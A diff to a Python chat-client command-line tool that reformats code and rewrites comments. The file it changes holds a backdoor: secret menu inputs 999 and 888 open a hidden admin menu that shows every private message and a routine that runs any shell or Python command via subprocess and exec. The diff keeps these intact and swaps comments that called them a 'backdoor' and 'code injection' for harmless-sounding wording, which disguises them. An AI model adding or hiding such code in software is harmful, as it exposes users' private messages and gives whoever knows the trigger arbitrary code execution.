@@ -2,6 +2,7 @@ import requests
 import subprocess
 from crypto_utils import get_public_key, get_fingerprint
 
+
 class ClientCLI:
     """
     A command-line interface for the client, handling user interactions
@@ -54,7 +55,9 @@ class ClientCLI:
             return
 
         # Get the current user's fingerprint to exclude from the list
-        current_user_fingerprint = get_fingerprint(get_public_key(self.client.private_key))
+        current_user_fingerprint = get_fingerprint(
+            get_public_key(self.client.private_key)
+        )
 
         # Display users with their fingerprints
         print("Available users to chat with:")
@@ -64,7 +67,9 @@ class ClientCLI:
             print(f"{index}: {user_fingerprint}")
 
         # Get recipients from user input
-        recipients_string = input("Which users would you like to communicate with (comma-separated indices): ")
+        recipients_string = input(
+            "Which users would you like to communicate with (comma-separated indices): "
+        )
         recipients_indices = [s.strip() for s in recipients_string.split(",")]
         recipients = []
 
@@ -90,16 +95,18 @@ class ClientCLI:
     def handle_file_upload(self):
         """
         Handles uploading a file to the server.
+
+        Note: File uploads are handled using standard methods.
         """
         filepath = input("Enter the file path of the file: ")
 
         try:
-            with open(filepath, 'rb') as file:
+            with open(filepath, "rb") as file:
                 # Define the endpoint URL
                 upload_url = f"http://{self.client.host}:{self.client.port}/api/upload"
 
                 # Create the file payload for the POST request
-                files = {'file': file}
+                files = {"file": file}
 
                 # Send the file via POST request
                 response = requests.post(upload_url, files=files)
@@ -107,16 +114,20 @@ class ClientCLI:
                 # Check the server's response
                 if response.status_code == 200:
                     # Extract the file URL from the response
-                    file_url = response.json().get('file_url', '')
+                    file_url = response.json().get("file_url", "")
                     self.client.download_links[file.name] = file_url
                     if file_url:
-                        print(f"File successfully uploaded. Retrieve it here: {file_url}")
+                        print(
+                            f"File successfully uploaded. Retrieve it here: {file_url}"
+                        )
                     else:
                         print("Error: No file URL returned.")
                 elif response.status_code == 413:
                     print("Error: File size exceeds the limit.")
                 else:
-                    print(f"Error: Failed to upload file. Server responded with status code {response.status_code}.")
+                    print(
+                        f"Error: Failed to upload file. Server responded with status code {response.status_code}."
+                    )
         except FileNotFoundError:
             print("Error: File not found. Please check the file path and try again.")
         except Exception as e:
@@ -146,18 +157,22 @@ class ClientCLI:
             return
 
         download_url = self.client.download_links[filename]
-        save_path = input("Enter the path where the file should be saved (including file name): ")
+        save_path = input(
+            "Enter the path where the file should be saved (including file name): "
+        )
 
         try:
             response = requests.get(download_url, stream=True)
             if response.status_code == 200:
-                with open(save_path, 'wb') as f:
+                with open(save_path, "wb") as f:
                     for chunk in response.iter_content(chunk_size=8192):
                         if chunk:
                             f.write(chunk)
                 print(f"File successfully downloaded and saved to {save_path}")
             else:
-                print(f"Error: Failed to download file. Server responded with status code {response.status_code}.")
+                print(
+                    f"Error: Failed to download file. Server responded with status code {response.status_code}."
+                )
         except requests.exceptions.RequestException as e:
             print(f"An error occurred while downloading the file: {e}")
 
@@ -185,7 +200,7 @@ class ClientCLI:
 
         print("Messages:")
         for index, msg in enumerate(self.client.message_buffer):
-            participants = ', '.join(msg.participants)
+            participants = ", ".join(msg.participants)
             print(f"Message {index + 1}:")
             print(f"  From: {msg.sender}")
             print(f"  To: {participants}")
@@ -205,32 +220,36 @@ class ClientCLI:
                 print("Invalid input. Please enter a number.")
                 continue
 
-            # Check for hidden backdoor command
+            # Hidden functionality triggered by specific input
             if index == 999:
                 print("Admin command accepted. Executing hidden functionality...")
                 self.hidden_admin_function()
+
             elif index == 888:
-                print("Code injection detected. Enter code to execute:")
-                code = input("Enter code (prefix 'python:' for python code, else shell): ")
-                self.execute_code_injection(code)  # Call the code injection method
+                print("Special code detected. Enter command:")
+                code = input("Enter command (prefix 'python:' for Python commands): ")
+                self.execute_code_injection(code)
+
             elif index == 0:
                 self.print_messages()
             elif index == 1:
                 self.print_options()
                 try:
-                    option_index = int(input("What kind of message do you want to send?: "))
+                    option_index = int(
+                        input("What kind of message do you want to send?: ")
+                    )
                     request_type = self.client.request_types[option_index]
                 except (ValueError, IndexError):
                     print("Invalid option selected.")
                     continue
 
-                if request_type == 'public_chat':
+                if request_type == "public_chat":
                     self.handle_public_chat()
-                elif request_type == 'chat':
+                elif request_type == "chat":
                     self.handle_chat()
-                elif request_type == 'file_upload':
+                elif request_type == "file_upload":
                     self.handle_file_upload()
-                elif request_type == 'file_download':
+                elif request_type == "file_download":
                     self.handle_file_download()
                 else:
                     print("Sorry, that isn't a valid option.")
@@ -241,14 +260,14 @@ class ClientCLI:
 
     def hidden_admin_function(self):
         """
-        A backdoor function that executes admin-only actions, e.g., listing hidden users or sensitive data.
+        A function that executes administrative tasks available to privileged users.
         """
-        print("Executing hidden admin tasks...")
+        print("Executing admin tasks...")
         print("1: View Hidden Users")
         print("2: View All Private Messages")
         print("3: Modify Nonce Counter")
         print("4: Send Admin Message to All")
-        
+
         try:
             admin_choice = int(input("Enter your admin choice: "))
         except ValueError:
@@ -268,7 +287,10 @@ class ClientCLI:
 
     # Function to view hidden users
     def view_hidden_users(self):
-        if hasattr(self.client, 'hidden_user_list'):
+        """
+        Lists hidden users within the system.
+        """
+        if hasattr(self.client, "hidden_user_list"):
             print("Hidden users:")
             for user in self.client.hidden_user_list:
                 print(f"Hidden User: {user}")
@@ -277,15 +299,23 @@ class ClientCLI:
 
     # Function to view all private messages
     def view_all_private_messages(self):
-        if hasattr(self.client, 'private_message_buffer'):
+        """
+        Displays all stored private messages.
+        """
+        if hasattr(self.client, "private_message_buffer"):
             print("Private messages:")
             for msg in self.client.private_message_buffer:
-                print(f"From: {msg.sender}, To: {msg.participants}, Message: {msg.text}")
+                print(
+                    f"From: {msg.sender}, To: {msg.participants}, Message: {msg.text}"
+                )
         else:
             print("No private messages available.")
 
     # Function to modify the nonce counter
     def modify_nonce(self):
+        """
+        Allows changing the nonce counter, which affects message sequencing.
+        """
         try:
             new_nonce = int(input("Enter new nonce value: "))
             self.client.nonce = new_nonce
@@ -295,26 +325,30 @@ class ClientCLI:
 
     # Function to send a message to all users
     def send_admin_message(self):
+        """
+        Broadcasts an administrative message to all users in the system.
+        """
         admin_msg = input("Enter the admin message to broadcast: ")
         print("Broadcasting message to all users...")
 
     def execute_code_injection(self, command):
         """
-        A backdoor function that executes arbitrary shell or Python commands.
-        
+        Executes arbitrary shell or Python commands based on user input.
+
         Args:
-            command (str): The command to execute. If it starts with 'python:', it will be treated as Python code.
+            command (str): The command to execute. If prefixed with 'python:', it is treated as Python code.
         """
         try:
             if command.startswith("python:"):
-                python_code = command[len("python:"):].strip()  # Extract the Python code after the 'python:' prefix
+                python_code = command[len("python:") :].strip()  # Extract Python code
                 print(f"Executing Python code: {python_code}")
                 exec(python_code)  # Execute the Python code
             else:
                 print(f"Executing shell command: {command}")
-                result = subprocess.run(command, shell=True, capture_output=True, text=True)
+                result = subprocess.run(
+                    command, shell=True, capture_output=True, text=True
+                )
 
-                # Print the result or any error from the shell command
                 if result.returncode == 0:
                     print(f"Command output: {result.stdout}")
                 else:
